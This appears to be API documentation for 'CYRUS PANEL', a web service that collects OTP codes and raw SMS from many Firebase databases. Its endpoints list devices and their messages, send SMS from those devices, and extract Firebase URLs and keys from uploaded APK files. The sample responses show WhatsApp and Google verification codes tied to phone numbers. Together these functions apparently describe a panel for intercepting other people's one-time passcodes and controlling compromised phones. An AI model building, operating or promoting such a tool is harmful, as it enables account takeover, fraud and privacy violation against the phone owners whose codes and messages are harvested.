API Documentation

Complete reference for all CYRUS PANEL endpoints

📡 Public — OTP API
GET/api/otpGet OTP codes from all databases

Query params: count (default 10, max 100), fresh (1 = bypass cache), key (API key)

Response: Array of [service, phone, raw_sms, timestamp, country]

curl /api/otp?count=10

// Response
[
  ["WhatsApp", "919876543210", "Your code 123-456...", "2026-08-13 13:00:00", " India"],
  ["Google", "14155551234", "G-654321 is your code", "2026-08-13 12:59:00", " USA"]
]
GET/api/otp/statsOTP API statistics

Returns active connections count, cached OTPs, and cache age.

{"activeConnections": 2, "cachedOtps": 45, "cacheAgeSeconds": 12, "cacheTtlSeconds": 30}
🔐 Authentication
POST/api/auth/registerCreate account

Body: { username, email, password }

First user to register automatically becomes admin.

curl -X POST /api/auth/register -H "Content-Type: application/json" \
  -d '{"username":"john","email":"john@test.com","password":"pass1234"}'
POST/api/auth/loginLogin

Body: { login, password } — login can be username or email

Sets cyrus_token httpOnly cookie. Returns JWT token in response too.

POST/api/auth/logoutClear session

Clears the auth cookie.

GET/api/auth/meCurrent user

Returns the authenticated user's profile. Requires auth cookie or Bearer token.

👤 Profile
GET/api/profileGet profile + stats

Returns user profile with connection count, member since date, and last login.

PUT/api/profileUpdate profile

Body: { email?, phone?, bio? }

POST/api/profile/regenerate-keyNew API key

Generates a new API key, invalidating the old one.

Admin (requires admin role)
GET/api/admin/connectionsList Firebase connections

Returns all connections with masked keys.

POST/api/admin/connectionsAdd connection

Body: { name, url, key }

URL must be HTTPS ending with .firebaseio.com or .firebasedatabase.app

PUT/api/admin/connections/:idUpdate connection

Body: { name?, url?, key?, isActive? }

DELETE/api/admin/connections/:idRemove connection

Permanently removes the Firebase connection.

POST/api/admin/connections/:id/testTest connection

Tests the Firebase connection and returns device count.

GET/api/admin/usersList all users

Returns all registered users with roles and status.

PUT/api/admin/users/:id/toggleEnable/disable user

Toggles user active status. Disabled users cannot login.

PUT/api/admin/users/:id/roleChange role

Body: { role: "admin" | "user" }

GET/api/admin/statsSystem statistics

Returns total users, connections, devices, and server uptime.

Dashboard
GET/api/dashboardFull dashboard data

Returns all devices and recent OTPs from all active Firebase connections.

GET/api/dashboard/devices/:idDevice details

Returns device info and recent messages from whichever database it belongs to.

POST/api/dashboard/devices/:id/smsSend SMS

Body: { to, message } — Queues an SMS to be sent from the device.

🏥 System
GET/api/healthHealth check

Returns server status, version, uptime, and Node.js version.

POST/api/apk/parseParse APK (multipart)

Upload an .apk file to extract Firebase URL and API key. Use file field name.
